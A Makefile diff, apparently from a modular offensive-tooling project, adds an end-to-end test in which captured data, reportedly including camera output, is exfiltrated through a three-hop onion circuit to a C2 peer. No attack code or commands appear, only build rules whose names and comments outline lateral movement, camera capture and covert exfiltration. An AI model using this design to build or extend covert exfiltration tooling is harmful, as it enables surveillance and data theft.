@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -47,6 +47,15 @@ $(AGOBJS):
 $(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# 回传层与已建立电路的 IO 绑定（记录 <-> fd），含短写/读满/截断判定
+$(BUILD)/exfil_link.o: src/exfil_link.c include/exfil_link.h include/exfil.h | $(BUILD)
+	$(CC) $(CFLAGS) -c $< -o $@
+
+# 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
+$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
+	  $(P2PLIB) $(C2OBJS) $(LATLIB)
+
 $(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
@@ -54,9 +63,10 @@ $(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(L
 $(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
+	./$(BUILD)/test_exfil_circuit
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
